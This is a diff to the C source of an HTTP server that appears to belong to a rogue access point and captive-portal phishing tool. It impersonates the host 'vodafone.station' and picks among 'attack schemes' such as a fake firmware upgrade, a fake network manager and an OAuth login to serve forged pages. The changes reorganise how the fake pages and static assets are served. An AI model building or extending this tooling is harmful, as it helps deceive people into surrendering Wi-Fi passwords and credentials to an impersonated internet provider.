@@ -27,10 +27,8 @@
 #include "web/jquery_min_js.h"
 
 #include "web/firmware_upgrade/index.h"
-#include "web/firmware_upgrade/loading.h"
-#include "web/firmware_upgrade/upgrading.h"
 
-#define CHUNK_SIZE 256
+#define CHUNK_SIZE 512
 
 static const char *TAG = "HTTPD";	//TAG for debug
 static const char *host = "vodafone.station";
@@ -39,10 +37,21 @@ static httpd_handle_t server = NULL;
 static target_info_t target = { 0 };
 
 
-static void httpd_send_chunked_data(httpd_req_t *req, const char *buffer, size_t len)
+static void httpd_send_chunked_data(httpd_req_t *req, const char *buffer, size_t len, const char *response_type)
 {
-	size_t bytes_remaining = len;
+	size_t bytes_remaining = len-1;
     size_t offset = 0;
+
+	/* Set basic text/html if response type is not specified */
+	if( response_type == NULL )
+	{
+		httpd_resp_set_type(req, "text/html");
+	}
+	else
+	{
+		httpd_resp_set_type(req, response_type);
+	}
+
 	httpd_resp_set_hdr(req, "Connection", "keep-alive");
     while (bytes_remaining > 0) 
 	{
@@ -55,16 +64,36 @@ static void httpd_send_chunked_data(httpd_req_t *req, const char *buffer, size_t
 }
 
 
-static void web_net_manager_scheme(httpd_req_t *req)
+/**
+ * @brief This function manage the file in the virtual folder /static/
+ * 
+ * @param req 
+ */
+static void web_virtual_static_folder_manager(httpd_req_t *req)
 {
-	httpd_resp_set_type(req, "text/html");
-	httpd_resp_send_chunk(req, fake_web_base_network_manager0, sizeof(fake_web_base_network_manager0));
-	httpd_resp_send_chunk(req, (char *)&target.ssid, strlen((char *)&target.ssid));
-	httpd_send_chunked_data(req, fake_web_base_network_manager, sizeof(fake_web_base_network_manager));
-	httpd_resp_send(req, NULL, 0);
+	/* bootstrap.min.css */
+	if( strcmp(req->uri, "/static/bootstrap.min.css") == 0 )
+	{
+		httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css), "text/css");
+	}
+	/* bootstrap.min.js */
+	else if( strcmp(req->uri, "/static/bootstrap.min.js") == 0 )
+	{
+		httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js), "application/javascript");
+	}
+	/* jquery.min.js */
+	else if( strcmp(req->uri, "/static/jquery.min.js") == 0 )
+	{
+		httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js), "application/javascript");
+	}
 }
 
 
+/**
+ * @brief All request all redirected here
+ * 
+ * @param req 
+ */
 static void captive_portal_redirect(httpd_req_t *req)
 {
 	/* Index */
@@ -73,11 +102,10 @@ static void captive_portal_redirect(httpd_req_t *req)
 		switch(target.attack_scheme)
 		{
 			case FIRMWARE_UPGRADE:
-				httpd_send_chunked_data(req, fu_index_html, sizeof(fu_index_html));
+				httpd_send_chunked_data(req, fu_index_html, sizeof(fu_index_html), NULL);
 				break;
 			
 			case WEB_NET_MANAGER:
-				web_net_manager_scheme(req);
 				break;
 
 			case PLUGIN_UPDATE:
@@ -91,71 +119,10 @@ static void captive_portal_redirect(httpd_req_t *req)
 		}
 		return;
 	}
-	/* loading.html */
-	else if( strcmp(req->uri, "/loading.html") == 0 )
+	/* Static folder manager */
+	else if( strstr(req->uri, "/static/") != NULL )
 	{
-		switch(target.attack_scheme)
-		{
-			case FIRMWARE_UPGRADE:
-				httpd_send_chunked_data(req, fu_loading_html, sizeof(fu_loading_html));
-				break;
-			
-			case WEB_NET_MANAGER:
-				web_net_manager_scheme(req);
-				break;
-
-			case PLUGIN_UPDATE:
-				break;
-
-			case OAUTH_LOGIN:
-				break;
-
-			default:
-				break;
-		}
-		return;
-	}
-	/* upgrading.html */
-	else if( strcmp(req->uri, "/upgrading.html") == 0 )
-	{
-		switch(target.attack_scheme)
-		{
-			case FIRMWARE_UPGRADE:
-				httpd_send_chunked_data(req, fu_upgrading_html, sizeof(fu_upgrading_html));
-				break;
-			
-			case WEB_NET_MANAGER:
-				web_net_manager_scheme(req);
-				break;
-
-			case PLUGIN_UPDATE:
-				break;
-
-			case OAUTH_LOGIN:
-				break;
-
-			default:
-				break;
-		}
-		return;
-	}
-	/* bootstrap.min.css */
-	else if( strcmp(req->uri, "/static/bootstrap.min.css") == 0 )
-	{
-		httpd_resp_set_type(req, "text/css");
-		httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css));
-	}
-	/* bootstrap.min.js */
-	else if( strcmp(req->uri, "/static/bootstrap.min.js") == 0 )
-	{
-		httpd_resp_set_type(req, "application/javascript");
-		httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js));
-	}
-	/* jquery.min.js */
-	else if( strcmp(req->uri, "/static/jquery.min.js") == 0 )
-	{
-		httpd_resp_set_type(req, "application/javascript");
-		httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js));
+		web_virtual_static_folder_manager(req);
 	}
 	/* favicon.ico */
 	else if( strcmp(req->uri, "/favicon.ico") == 0 )
